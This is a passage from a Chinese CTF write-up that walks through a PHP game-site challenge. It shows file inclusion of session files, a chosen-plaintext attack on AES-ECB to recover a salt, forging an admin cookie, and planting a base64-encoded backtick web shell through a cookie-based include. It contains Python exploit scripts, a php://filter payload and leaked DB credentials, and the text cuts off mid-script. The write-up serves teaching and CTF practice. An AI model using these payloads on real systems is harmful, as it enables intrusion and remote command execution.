title="index.php"></a>index.php</h2><p><code>index.php</code> 文件中有如下语句，显然存在文件包含。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'page'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'page'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但所有 <code>GET</code> 和<code>POST</code> 提交的参数都会被删除掉敏感字符串，其中 <code>//</code> 、<code>(.+)</code> 和<code>`</code> `  是比较值得注意的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.</span></span><br><span class="line"><span class="comment">//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!</span></span><br><span class="line">$too_bad=<span class="string">"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is"</span>;</span><br><span class="line">$value = preg_replace($too_bad, str_repeat(<span class="string">"*"</span>,<span class="number">3</span>) ,$value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($value))&#123;mapl_die();&#125;</span><br><span class="line">$value=bad_words($value);</span><br><span class="line">$_GET[$key]=$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key2=&gt;$value2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (is_array($value2))&#123;mapl_die();&#125;</span><br><span class="line">$value2=bad_words($value2);</span><br><span class="line">$_POST[$key2]=$value2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP使用PHPSESSID cookie值 存储会话标识，一般在<code>/var/lib/php/sessions/sess_&lt;PHPSESSID&gt;</code> 文件里写有一些有特定意义的字符串，其中<code>&lt;PHPSESSID&gt;</code> 可在Cookie里找到。尝试读取SESSION文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5</span></span><br></pre></td></tr></table></figure><p><img src="1532088004024.png" alt="1532088004024"></p><p>其中是序列化后的<code>$_SESSION</code> 和明文的操作记录，这些内容在后面会大有用处。</p><h1 id="CPA猜解salt"><a href="#CPA猜解salt" class="headerlink" title="CPA猜解salt"></a>CPA猜解salt</h1><h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><p>阅读<code>login.php</code> 并跟入相关文件，可以看到有多处用到<code>$salt</code> 变量，其地位非常关键。</p><p>首先是从单独的表<code>mapl_config</code> 中读出值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    $configRow=config_connect($conn);</span><br><span class="line">    $salt=$configRow[<span class="string">'mapl_salt'</span>];</span><br><span class="line">    $key=$configRow[<span class="string">'mapl_key'</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function config_connect($conn)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $config=mysqli_query($conn,"SELECT * FROM mapl_config");</span></span><br><span class="line"><span class="comment">        return mysqli_fetch_array($config);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>如果登陆成功就将用户名和邮箱加盐加密存储的<code>$_SESSION</code> 变量里。并且将<code>admin</code> /<code>user</code> 字符串加盐加密存储在<code>$_COOKIE[&#39;_role&#39;]</code> 变量中，用以标识用户身份。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $count === <span class="number">1</span> &amp;&amp; $row[<span class="string">'userPass'</span>]===$password ) <span class="comment">//登陆成功</span></span><br><span class="line">&#123;</span><br><span class="line">$secure_email=encryptData($row[<span class="string">'userEmail'</span>],$salt,$key);</span><br><span class="line">$secure_name=encryptData($row[<span class="string">'userName'</span>],$salt,$key);</span><br><span class="line">$log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] Logged In'</span>;</span><br><span class="line">$_SESSION[<span class="string">'character_name'</span>] = $secure_name;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = $secure_email;</span><br><span class="line">    $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line"><span class="keyword">if</span> ($row[<span class="string">'userIsAdmin'</span>]===<span class="string">'1'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$data=<span class="string">'admin'</span>.$salt;</span><br><span class="line">$role=hash(<span class="string">'sha256'</span>, $data);</span><br><span class="line">setcookie(<span class="string">'_role'</span>,$role);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$data=<span class="string">'user'</span>.$salt;</span><br><span class="line">$role=hash(<span class="string">'sha256'</span>, $data);</span><br><span class="line">setcookie(<span class="string">'_role'</span>,$role);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">"Location: ?page=home.php"</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function encryptData($data,$salt,$key)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">            $encrypt=openssl_encrypt($data.$salt,"AES-128-ECB",$key);</span></span><br><span class="line"><span class="comment">            $raw=base64_decode($encrypt);</span></span><br><span class="line"><span class="comment">            $final=implode(unpack("H*", $raw));</span></span><br><span class="line"><span class="comment">            return $final;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="setting-php"><a href="#setting-php" class="headerlink" title="setting.php"></a>setting.php</h2><p>再查看<code>setting.php</code> ，这个文件实现了修改用户名页面的功能 。只要修改后的名字不长于22个字符，就使用<code>mysqli_real_escape_string</code> 处理并更新记录（避免SQL注入）。会被编码的字符有的 NUL（ASCII 0）、\n、\r、\、’、” 和 Control-Z。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($_POST[<span class="string">'name'</span>])&lt;=<span class="number">22</span>)&#123;</span><br><span class="line">    $name=mysqli_real_escape_string($conn,$_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $query=<span class="string">"UPDATE users SET userName='$name' WHERE userEmail='$mail'"</span>;</span><br><span class="line">    $res2=mysqli_query($conn,$query);</span><br><span class="line">    $userRow2=mysqli_fetch_array($res2);</span><br><span class="line">    $secure_name=encryptData($name,$salt,$key);</span><br><span class="line">    $_SESSION[<span class="string">'character_name'</span>] = $secure_name;</span><br><span class="line">    $log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] Change character name'</span>;</span><br><span class="line">    $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line">    header(<span class="string">"Refresh:0"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有加密操作用的是同一个<code>$salt</code> ，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了<code>AES-128-ECB</code> ，<code>ECB</code> 全称<code>Electronic Codebook</code> （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。</p><p>这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：</p><p>如果用户名是<code>findneo</code> 七个字节，<code>$salt</code> 是<code>xianzhi</code> 八个字节，那么加密过程就是把<code>findneoxianzhi</code> 共十五个字节作为一个分组去加密，缺一个字节按算法padding。</p><p>如果用户名是<code>hifindneo</code> 共九个字节，那么加密过程就是对<code>hifindne</code> 和<code>oxianzhi</code> 作为两个分组加密。</p><p>我们可以在<code>SETTING</code> 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>怎么攻击呢？比如用户名是<code>findneo</code> ，（我们还不知道<code>$salt</code> 是<code>xianzhi</code> ） ，那么加密的第一个明文分组是<code>findneox</code> ，记录下<code>$_SESSION[&#39;character_name&#39;]</code> 的前32个字节十六进制数，也就是密文的第一个分组。</p><p>然后依次改变用户名为<code>findneoa</code> 、<code>findneob</code> 、.etc，并记录密文第一个分组。直到用户名为<code>findneox</code> 时发现密文第一个分组与用户名为<code>findneo</code> 时的相同。根据ECB模式的特点，就能知道<code>$salt</code> 的第一个字节为<code>x</code> ，事实上也确实如此。</p><p>测试发现用户名长15个字符时，<code>$_SESSION[&#39;character_name&#39;]</code> 有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，<code>$_SESSION[&#39;character_name&#39;]</code> 有96字节，也就加盐加密后有48个字符。这说明<code>$salt</code> 长为16个字节。</p><p>然后就可以按照以上原理猜解<code>$salt</code> ，伪造<code>$_COOKIE[&#39;_role&#39;]</code> ，成为管理员。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'t9p07a1qt2plbcqp8tpkib4794'</span>,</span><br><span class="line">    <span class="comment"># _role='8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_sess</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(</span><br><span class="line">        url + <span class="string">"?page=/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>],</span><br><span class="line">        cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sess_character_name</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""read_sess():</span></span><br><span class="line"><span class="string">    character_name|s:64:"6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820";</span></span><br><span class="line"><span class="string">    user|s:64:"82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38";</span></span><br><span class="line"><span class="string">    action|s:40:"[12:04:21pm GMT+7] Change character name";</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    character_name = read_sess().split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">":"</span>)[<span class="number">-1</span>][<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> character_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url + <span class="string">"?page=home.php"</span>, cookies=cookie)</span><br><span class="line">    s = BeautifulSoup(r.content, <span class="string">'lxml'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.h2.get_text().split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_and_check</span><span class="params">(name)</span>:</span></span><br><span class="line">    change_name(name)</span><br><span class="line">    <span class="comment"># whoami()</span></span><br><span class="line">    <span class="keyword">return</span> get_sess_character_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">()</span>:</span></span><br><span class="line">    junk = <span class="string">'x'</span> * <span class="number">16</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    s = <span class="string">'ms_g00d_0ld_g4m3'</span> + string.printable</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        cmp = change_and_check(junk[:i])[:<span class="number">32</span>]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可</span></span><br><span class="line">            cmp = change_and_check(junk)[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> cmp == change_and_check(junk[:i] + salt + j)[:<span class="number">32</span>]:</span><br><span class="line">                salt += j</span><br><span class="line">                <span class="keyword">print</span> salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">salt = crack_salt()</span><br></pre></td></tr></table></figure><p>爆破得到<code>$salt</code> 为<code>ms_g00d_0ld_g4m3</code> ，然后计算出<code>admin</code> 用户的Cookie为<code>hashlib.sha256(&#39;admin&#39; + salt).hexdigest()</code>   也就是<code>_role=&#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#39;</code>。 </p><p><img src="1532066767366.png" alt="1532066767366"></p><p>可使用Fiddler的Filters功能设置请求头为<code>PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe</code> ，权限上升为ADMIN。</p><p><img src="1532072362986.png" alt="1532072362986"></p><h1 id="以Cookie为跳板的Session文件包含"><a href="#以Cookie为跳板的Session文件包含" class="headerlink" title="以Cookie为跳板的Session文件包含"></a>以Cookie为跳板的Session文件包含</h1><h2 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h2><p>注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有<code>admin.php</code>  中写入的内容存在可控变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_POST[<span class="string">'pet'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'pet'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">    $dir=<span class="string">'./upload/'</span>.md5($salt.$_POST[<span class="string">'email'</span>]).<span class="string">'/'</span>;</span><br><span class="line">    give_pet($dir,$_POST[<span class="string">'pet'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(check_available_pet($_POST[<span class="string">'pet'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] gave '</span>.$_POST[<span class="string">'pet'</span>].<span class="string">' to player '</span>.search_name_by_mail($conn,$_POST[<span class="string">'email'</span>]);</span><br><span class="line">        $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的<code>search_name_by_mail($conn,$_POST[&#39;email&#39;])</code> 正是用户名，而这是可修改的。所以只要在<code>CHARACTER</code> 页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。</p><p>用户名修改有哪些限制？</p><p>首先是<code>文件包含</code> 小节提到的所有<code>GET</code> ，<code>POST</code> 参数都必须经过的黑名单过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span><span class="params">($value)</span></span>&#123;$too_bad=<span class="string">"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is"</span>;</span><br><span class="line">$value = preg_replace($too_bad, str_repeat(<span class="string">"*"</span>,<span class="number">3</span>) ,$value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># |\/\/|\(.+\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。</span></span><br></pre></td></tr></table></figure><p>然后是<code>setting.php</code> （代码见<code>CPA猜解salt</code> 小节）中要求的不大于22个字符。</p><h2 id="character-php"><a href="#character-php" class="headerlink" title="character.php"></a>character.php</h2><p>所有功能中唯一一个直接写文件的操作在和<code>CHARACTER</code> 页面，同样需经过黑名单过滤，并且要求小于20个字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'command'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'command'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_POST[<span class="string">'command'</span>])&gt;=<span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;strong&gt;Too Long&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        save_command($mail,$salt,$_POST[<span class="string">'command'</span>]);</span><br><span class="line">        header(<span class="string">"Refresh:0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function save_command($email,$salt,$data)&#123;</span></span><br><span class="line"><span class="comment">$dir='./upload/'.md5($salt.$email);</span></span><br><span class="line"><span class="comment">file_put_contents($dir.'/command.txt', $data);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在<code>CHARACTER</code> 页面修改<code>command.txt</code> ，但两处都是由<code>GET</code> 或<code>POST</code> 传的参，参数被黑名单过滤导致无法直接发挥作用。</p><p>考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在<code>command.txt</code> 写入编码后的无害字符串，在Cookie写入利用伪协议读取 <code>command.txt</code>  并解码的语句，就成功向Session文件写入了一句话。</p><p>其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul><li>在SETTING处修改用户名为<code>&lt;?=include&quot;$_COOKIE[a]</code> </li><li>在Fiddler的Filters处的Cookie后面添加上一条<code>a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt</code></li><li>在character处给宠物发一条命令 <code>PD89YCRfR0VUW2ZdYDs</code> 从而写入<code>command.txt</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PD89YCRfR0VUW2ZdYDs 可解码为 &lt;?=`$_GET[f]`;</span></span><br></pre></td></tr></table></figure><p><img src="1532072718776.png" alt="1532072718776"></p><ul><li>在admin处给自己送一只宠物</li></ul><p><img src="1532072632523.png" alt="1532072632523"></p><p>使执行语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] gave '</span>.$_POST[<span class="string">'pet'</span>].<span class="string">' to player '</span>.search_name_by_mail($conn,$_POST[<span class="string">'email'</span>]);</span><br></pre></td></tr></table></figure><p>而其中的<code>search_name_by_mail($conn,$_POST[&#39;email&#39;]</code> 正是用户名<code>&lt;?=include&quot;$_COOKIE[a]</code> </p><p>所以包含session文件就可以把Cookie里的变量a 包含进来，而a又是command.txt解码后的结果，也就是一句话木马。这时就可以以f为密码传入任意命令了。</p><ul><li>读到数据库配置文件</li></ul><p><img src="1532073478518.png" alt="1532073478518"></p><ul><li>读到配置文件dbconnect.php </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'DBHOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'DBUSER'</span>, <span class="string">'mapl_story_user'</span>);</span><br><span class="line">define(<span class="string">'DBPASS'</span>, <span class="string">'tsu_tsu_tsu_tsu'</span>); </span><br><span class="line">define(<span class="string">'DBNAME'</span>, <span class="string">'mapl_story'</span>);</span><br><span class="line">$conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME);</span><br><span class="line"><span class="keyword">if</span> ( !$conn ) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Connection failed : "</span> . mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>然后执行命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;SELECT * FROM mapl_config;&apos;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br><span class="line">或</span><br><span class="line">mysql -e&apos;select * from mapl_config&apos; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br></pre></td></tr></table></figure><p><img src="1532073884330.png" alt="1532073884330"></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>也可参考脚本理清利用过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    payload = dict(pet=<span class="string">"babydragon"</span>, email=user_email, submit=<span class="string">"Give"</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">'?page=admin.php'</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(cmd=<span class="string">"testcmd"</span>)</span>:</span></span><br><span class="line">    payload = dict(command=cmd, submit=<span class="string">"Send"</span>)</span><br><span class="line">    r = requests.post(</span><br><span class="line">        url + <span class="string">"?page=character.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 